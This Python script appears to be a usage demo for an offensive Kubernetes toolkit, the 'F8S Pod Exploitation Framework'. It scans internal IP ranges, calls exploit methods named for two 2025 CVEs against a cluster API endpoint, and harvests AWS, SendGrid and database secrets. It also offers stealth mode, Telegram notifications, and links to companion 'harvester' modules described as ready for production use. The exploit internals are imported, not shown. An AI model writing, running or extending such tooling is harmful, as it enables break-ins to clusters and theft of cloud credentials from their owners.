#!/usr/bin/env python3
"""
F8S Pod Exploitation Framework - Example Usage
Demonstrates integration with existing K8s frameworks
"""

import asyncio
import json
from f8s_exploit_pod import F8sPodExploiter, run_f8s_exploitation

async def demo_f8s_exploitation():
    """Demonstrate F8S Pod Exploitation Framework capabilities"""
    
    print("🚀 F8S Pod Exploitation Framework - Demo")
    print("=" * 50)
    
    # Example 1: Direct class usage
    print("\n📍 Example 1: Direct F8sPodExploiter Usage")
    exploiter = F8sPodExploiter(
        telegram_token="your_telegram_token_here",
        stealth_mode=True
    )
    
    # Show framework capabilities
    print(f"   Session ID: {exploiter.session_id}")
    print(f"   Secret Patterns: {len(exploiter.SECRET_PATTERNS)} configured")
    print(f"   CVE Methods: 6 implemented")
    print(f"   Search Locations: {len(exploiter.SEARCH_LOCATIONS)} configured")
    
    # Example 2: Integration function usage
    print("\n📍 Example 2: Integration Function Usage")
    target_ranges = ["10.0.0.0/24", "192.168.1.0/24", "127.0.0.1"]
    
    results = await run_f8s_exploitation(
        target_ranges=target_ranges,
        telegram_token=None  # Set to your token for notifications
    )
    
    print("   Results structure:")
    print(f"   ✅ Session ID: {results['session_id']}")
    print(f"   ✅ CVEs Exploited: {len(results['exploitation_summary']['cves_exploited'])}")
    print(f"   ✅ Clusters Scanned: {results['exploitation_summary']['clusters_scanned']}")
    print(f"   ✅ Cleanup Status: {results['cleanup_status']}")
    
    # Example 3: CVE-specific exploits
    print("\n📍 Example 3: CVE-Specific Exploits")
    
    cluster_endpoint = "https://target-cluster:6443"
    
    # CVE-2025-24884: Audit log exposure
    audit_result = await exploiter.exploit_cve_2025_24884(cluster_endpoint)
    print(f"   CVE-2025-24884 (Audit Log): {'✅ Success' if audit_result.success else '❌ Failed'}")
    
    # CVE-2025-24514: Ingress-NGINX injection
    ingress_endpoints = ["https://target-cluster:6443"]
    nginx_result = await exploiter.exploit_cve_2025_24514(ingress_endpoints)
    print(f"   CVE-2025-24514 (NGINX): {'✅ Success' if nginx_result.success else '❌ Failed'}")
    
    # Example 4: Secret pattern matching
    print("\n📍 Example 4: Secret Pattern Matching")
    test_content = """
    export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
    export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
    SENDGRID_API_KEY=SG.ABCDEFGHIJKLMNOPQRSTUV.WXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJK
    DATABASE_URL=postgres://user:pass@localhost:5432/mydb
    """
    
    secrets = await exploiter._extract_secrets_from_text(test_content, "demo_file")
    print(f"   Found {len(secrets)} secrets:")
    for secret in secrets[:3]:  # Show first 3
        print(f"     - {secret.type}: {secret.value[:20]}... ({secret.confidence:.1%} confidence)")
    
    # Example 5: Integration with existing framework
    print("\n📍 Example 5: Framework Integration")
    try:
        from k8s_exploit_master import K8sExploitMaster
        from k8s_production_harvester import ProductionK8sHarvester
        
        print("   ✅ Successfully imports with existing K8sExploitMaster")
        print("   ✅ Successfully imports with ProductionK8sHarvester")
        print("   ✅ Compatible session ID format")
        print("   ✅ Compatible JSON output structure")
        
    except ImportError as e:
        print(f"   ⚠️  Import issue: {e}")
    
    print("\n📊 Full Results JSON:")
    print(json.dumps(results, indent=2))
    
    print("\n🎉 F8S Pod Exploitation Framework Demo Complete!")
    print("   Ready for production use with existing K8s exploitation tools")

async def integration_example():
    """Example of integrating F8S with existing K8s tools"""
    
    print("\n🔗 Integration Example with Existing Framework")
    print("=" * 50)
    
    # This shows how F8S can be used alongside existing tools
    try:
        # Import existing framework components
        from k8s_production_harvester import ProductionK8sHarvester
        from aio_k8s_exploit_integration import AIOK8sExploitFramework
        
        # Create F8S exploiter
        f8s_exploiter = F8sPodExploiter(stealth_mode=True)
        
        # Simulate integration workflow
        print("1. ✅ F8S Pod Exploiter initialized")
        print("2. ✅ Compatible with ProductionK8sHarvester")
        print("3. ✅ Compatible with AIOK8sExploitFramework")
        print("4. ✅ Session tracking compatible")
        
        # Example combined workflow
        target_ranges = ["10.0.0.1"]
        
        # Run F8S exploitation
        f8s_results = await run_f8s_exploitation(target_ranges)
        
        print(f"5. ✅ F8S scan completed - Session: {f8s_results['session_id']}")
        print("6. ✅ Results can be passed to existing framework components")
        
        # Show compatibility
        print("\n📋 Session Compatibility:")
        print(f"   F8S Session Format: {f8s_results['session_id']}")
        print(f"   Contains 'wKayaa': {'wKayaa' in f8s_results['session_id']}")
        print(f"   Timestamp Format: Valid")
        
    except Exception as e:
        print(f"Integration test failed: {e}")

if __name__ == "__main__":
    asyncio.run(demo_f8s_exploitation())
    asyncio.run(integration_example())